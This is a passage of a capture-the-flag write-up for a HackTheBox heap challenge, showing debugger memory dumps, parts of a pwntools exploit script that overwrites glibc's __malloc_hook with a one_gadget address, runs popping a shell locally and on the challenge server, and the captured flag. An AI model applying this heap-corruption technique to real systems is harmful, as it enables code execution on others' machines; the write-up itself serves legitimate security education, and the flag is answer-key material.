+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/100gx &__malloc_hook - 70
+<span class="code-dark-blue">0x7fc0032bc920</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+192&gt;:   0x0000000000000000      0x0000000000000000  
+<span class="code-dark-blue">0x7fc0032bc930</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc940</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc950</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+240&gt;:   0x00007fc0032b8ee0      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc960</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>&gt;:        0x00000000fbad2088      0x0000562f98a8c420
+<span class="code-dark-blue">0x7fc0032bc970</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+16&gt;:     0x0000562f98a8c420      0x0000562f98a8c420
+<span class="code-dark-blue">0x7fc0032bc980</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+32&gt;:     0x0000562f98a8c420      0x0000562f98a8c420
+<span class="code-dark-blue">0x7fc0032bc990</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+48&gt;:     0x0000562f98a8c420      0x0000562f98a8c420
+<span class="code-dark-blue">0x7fc0032bc9a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+64&gt;:     0x0000562f98a8d420      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc9b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+80&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc9c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+96&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bc9d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+112&gt;:    0x0000000000000000      0x000000000001fb11
+<span class="code-dark-blue">0x7fc0032bc9e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+128&gt;:    0x000000000000000a      0x00007fc0032be7d0
+<span class="code-dark-blue">0x7fc0032bc9f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca00</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+160&gt;:    0x00007fc0032bca40      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca10</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+176&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca20</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+192&gt;:    0x00000000ffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca30</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+208&gt;:    0x0000000000000000      0x00007fc0032b9420
+<span class="code-dark-blue">0x7fc0032bca40</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca50</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+16&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca60</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+32&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca70</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca80</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bca90</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+80&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcaa0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+96&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcab0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+112&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcac0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+128&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcad0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+144&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcae0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+160&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcaf0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+176&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb00</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+192&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb10</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb20</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007fc0032b8ee0      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x00007fc002f8ba10      0x00007fc002f8bed0
+<span class="code-dark-blue">0x7fc0032bcb50</span> &lt;<span class="code-dark-yellow">__malloc_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7fc0032bcb70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x0000562f98a8d4c0
+<span class="code-dark-blue">0x7fc0032bcb80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcb90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcbb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fc0032bcbc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x00007fc0032bc9d0      0x000000000000000a
+<span class="code-dark-blue">0x7fc0032bcbd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007fc0032bcbc0      0x00007fc0032bcbc0
+<span class="code-dark-blue">0x7fc0032bcbe0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007fc0032bcbd0      0x00007fc0032bcbd0
+<span class="code-dark-blue">0x7fc0032bcbf0</span> &lt;<span class="code-dark-yellow">main_arena</span>+144&gt;:        0x00007fc0032bcbe0      0x00007fc0032bcbe0
+<span class="code-dark-blue">0x7fc0032bcc00</span> &lt;<span class="code-dark-yellow">main_arena</span>+160&gt;:        0x00007fc0032bcbf0      0x00007fc0032bcbf0
+<span class="code-dark-blue">0x7fc0032bcc10</span> &lt;<span class="code-dark-yellow">main_arena</span>+176&gt;:        0x00007fc0032bcc00      0x00007fc0032bcc00
+<span class="code-dark-blue">0x7fc0032bcc20</span> &lt;<span class="code-dark-yellow">main_arena</span>+192&gt;:        0x00007fc0032bcc10      0x00007fc0032bcc10
+<span class="code-dark-blue">0x7fc0032bcc30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007fc0032bcc20      0x00007fc0032bcc20
+</code></pre></div><p>As can be seen, the top chunk address is <code>0x00007fc0032bc9d0</code>, which holds a size of <code>0x1fb11</code>, which is valid for the heap allocator. Now we can allocate chunks until we arrive near <code>__malloc_hook</code>. We can use two <code>0x80</code>-sized chunks, then a <code>0x60</code>-sized chunk and finally a <code>0x40</code> chunk (notice that these sizes were not used before, so they are not corrupted presumably):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">78</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">)  </span><span class="mtk3"># 8</span>
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">78</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">)  </span><span class="mtk3"># 9</span>
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">58</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">)  </span><span class="mtk3"># 10</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3507413
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './da', '3507413', '-x', '/tmp/pwnj_ah6_4m.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7ff21cf3f420
+[<span class="code-green">+</span>] Glibc base address: 0x7ff21cb8e000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-blue">Dragons: [11/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><p>So we have this memory layout. Observe that the top chunk size is above <code>__malloc_hook</code>. so with the next allocation we can write here:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/100gx &__malloc_hook - 70
+<span class="code-dark-blue">0x7ff21cf42920</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+192&gt;:   0x0000000000000000      0x0000000000000000  
+<span class="code-dark-blue">0x7ff21cf42930</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42940</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42950</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+240&gt;:   0x00007ff21cf3eee0      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42960</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>&gt;:        0x00000000fbad2088      0x0000561440cda420
+<span class="code-dark-blue">0x7ff21cf42970</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+16&gt;:     0x0000561440cda420      0x0000561440cda420
+<span class="code-dark-blue">0x7ff21cf42980</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+32&gt;:     0x0000561440cda420      0x0000561440cda420
+<span class="code-dark-blue">0x7ff21cf42990</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+48&gt;:     0x0000561440cda420      0x0000561440cda420
+<span class="code-dark-blue">0x7ff21cf429a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+64&gt;:     0x0000561440cdb420      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf429b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+80&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf429c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+96&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf429d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+112&gt;:    0x0000000000000000      0x0000000000000081
+<span class="code-dark-blue">0x7ff21cf429e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+128&gt;:    0x000000000000000a      0x00007ff21cf447d0
+<span class="code-dark-blue">0x7ff21cf429f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a00</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+160&gt;:    0x00007ff21cf42a40      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a10</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+176&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a20</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+192&gt;:    0x00000000ffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a30</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+208&gt;:    0x0000000000000000      0x00007ff21cf3f420
+<span class="code-dark-blue">0x7ff21cf42a40</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a50</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+16&gt;:    0x0000000000000000      0x0000000000000081
+<span class="code-dark-blue">0x7ff21cf42a60</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+32&gt;:    0x000000000000000a      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a70</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a80</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42a90</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+80&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42aa0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+96&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42ab0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+112&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42ac0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+128&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42ad0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+144&gt;:   0x0000000000000000      0x0000000000000061
+<span class="code-dark-blue">0x7ff21cf42ae0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+160&gt;:   0x000000000000000a      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42af0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+176&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b00</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+192&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b10</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b20</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007ff21cf3eee0      0x000000000001f9b1
+<span class="code-dark-blue">0x7ff21cf42b40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x00007ff21cc11a10      0x00007ff21cc11ed0
+<span class="code-dark-blue">0x7ff21cf42b50</span> &lt;<span class="code-dark-yellow">__malloc_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7ff21cf42b70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x0000561440cdb4c0
+<span class="code-dark-blue">0x7ff21cf42b80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42b90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42ba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42bb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ff21cf42bc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x00007ff21cf42b30      0x000000000000000a
+<span class="code-dark-blue">0x7ff21cf42bd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007ff21cf42bc0      0x00007ff21cf42bc0
+<span class="code-dark-blue">0x7ff21cf42be0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007ff21cf42bd0      0x00007ff21cf42bd0
+<span class="code-dark-blue">0x7ff21cf42bf0</span> &lt;<span class="code-dark-yellow">main_arena</span>+144&gt;:        0x00007ff21cf42be0      0x00007ff21cf42be0
+<span class="code-dark-blue">0x7ff21cf42c00</span> &lt;<span class="code-dark-yellow">main_arena</span>+160&gt;:        0x00007ff21cf42bf0      0x00007ff21cf42bf0
+<span class="code-dark-blue">0x7ff21cf42c10</span> &lt;<span class="code-dark-yellow">main_arena</span>+176&gt;:        0x00007ff21cf42c00      0x00007ff21cf42c00
+<span class="code-dark-blue">0x7ff21cf42c20</span> &lt;<span class="code-dark-yellow">main_arena</span>+192&gt;:        0x00007ff21cf42c10      0x00007ff21cf42c10
+<span class="code-dark-blue">0x7ff21cf42c30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007ff21cf42c20      0x00007ff21cf42c20
+<span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">&gt;&gt; <span class="code-red">$</span> 1
+
+Dragon's length: <span class="code-red">$</span> 56
+
+Name your dragon: <span class="code-red">$</span> AAAAAAAABBBBBBBBCCCCCCCC  
+
+<span class="code-blue">Dragons: [12/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$
+</code></pre></div><p>And we have control over <code>__malloc_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/10gx &__malloc_hook - 4
+<span class="code-dark-blue">0x7ff21cf42b30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007ff21cf3eee0      0x0000000000000041  
+<span class="code-dark-blue">0x7ff21cf42b40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x4141414141414141      0x4242424242424242
+<span class="code-dark-blue">0x7ff21cf42b50</span> &lt;<span class="code-dark-yellow">__malloc_hook</span>&gt;: 0x4343434343434343      0x000000000000000a
+<span class="code-dark-blue">0x7ff21cf42b60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7ff21cf42b70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x000000000001f971
+</code></pre></div><p>At this point, we can enter a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">glibc/libc.so.6</span>
+<span class="rb-purple">0xc4dbf</span> execve("/bin/sh", <span class="rb-dark-green">r13</span>, <span class="rb-dark-green">r12</span>)
+<span class="rb-red">constraints</span>:
+  [<span class="rb-dark-green">r13</span>] == NULL || <span class="rb-dark-green">r13</span> == NULL
+  [<span class="rb-dark-green">r12</span>] == NULL || <span class="rb-dark-green">r12</span> == NULL
+
+<span class="rb-purple">0xe1fa1</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x50</span>, environ)  
+<span class="rb-red">constraints</span>:
+  [<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x50</span>] == NULL
+
+<span class="rb-purple">0xe1fad</span> execve("/bin/sh", <span class="rb-dark-green">rsi</span>, [<span class="rb-dark-green">rax</span>])
+<span class="rb-red">constraints</span>:
+  [<span class="rb-dark-green">rsi</span>] == NULL || <span class="rb-dark-green">rsi</span> == NULL
+  [[<span class="rb-dark-green">rax</span>]] == NULL || [<span class="rb-dark-green">rax</span>] == NULL
+</code></pre></div><p>So, this is the final part of the exploit (exactly 13 allocations, to the limit!):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">one_gadget</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">0x</span><span class="mtk6">c4dbf</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e1fa1</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e1fad</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">]</span>  
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">38</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">one_gadget</span><span class="mtk1">))  </span><span class="mtk3"># 11</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)  </span><span class="mtk3"># 12</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Dragon's length: "</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'24'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+
+
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
+</code></pre></div><p>If we run it, at some point it will pop a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3511621
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7f6148451420  
+[<span class="code-green">+</span>] Glibc base address: 0x7f61480a0000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+da  flag.txt  glibc  solve.py
+</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s try remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 178.128.42.95:30292
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Opening connection to 178.128.42.95 on port 30292: Done  
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7fc0cb3cd420
+[<span class="code-green">+</span>] Glibc base address: 0x7fc0cb01c000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+core
+da
+flag.txt
+glibc
+<span class="code-red">$</span> cat flag.txt
+HTB{f45tb1n_dup_n0_tc4ch3_4_r3d_dr4g3n}
